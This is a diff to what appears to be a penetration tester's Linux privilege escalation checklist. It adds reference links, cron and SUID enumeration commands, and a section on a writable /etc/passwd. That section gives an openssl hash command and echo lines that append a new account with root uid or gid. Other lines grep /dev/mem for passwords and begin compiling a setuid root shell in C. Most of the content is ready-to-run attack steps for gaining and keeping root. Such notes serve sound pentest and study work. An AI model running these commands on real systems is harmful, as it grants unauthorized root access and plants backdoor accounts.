@@ -1,4 +1,11 @@
 # Linux Privilege Escalation Checklist
+# References:
+# https://guif.re/linuxeop (methodology to follow)
+# https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md
+# https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+# https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html
+# https://payatu.com/guide-linux-privilege-escalation
+
 # Tools:
 # - linenum.sh
 # - linPEAS
@@ -60,6 +67,16 @@ egrep -ri '(mysql_connect\(|mysqli_connect\(|new mysqli\(|PDO\(\"mysql:)' /var/w
 
 Check: /etc/security/opasswd
 
+## Writeable /etc/passwd
+Generate a new hash by doing:
+openssl passwd -1 -salt [salt] [password]
+;; using salt "new" and password "123"
+openssl passwd -1 -salt new 123
+;; then, creating user called "newusername" and gids 3000 (we can choose this) and 0 (root):
+echo 'newusername:$1$new$p7ptkEKU1HnaHpRtzNizS1:3000:0:new,,,:/tmp:/bin/bash' >> /etc/passwd
+;; or
+echo 'newusername:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
+
 ## In-Memory Passwords
 strings /dev/mem -n10 | grep -i PASS
 
@@ -81,15 +98,19 @@ find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
 
 # Detect CRON jobs
 
+## View scheduled cron
+cat /etc/crontab
+
 ## List all cron jobs
 for i in d hourly daily weekly monthly; do echo; echo "--cron.$i--"; ls -l /etc/cron.$i; done
 
 ## Print commands and file system events and scan procfs every 1000 ms (=1sec)
 pspy64 -pf -i 1000 
 
-# Find SUID binaries
-find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-find / -uid 0 -perm -4000 -type f 2>/dev/null
+# Find SUID/SGID binaries
+find / -perm -u=s -type f -exec ls -la {} 2>/dev/null \;
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;   ;; finds only SUID
+find / -uid 0 -perm -4000 -type f 2>/dev/null               ;; finds only SUID
 
 # Create SUID binaries
 print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
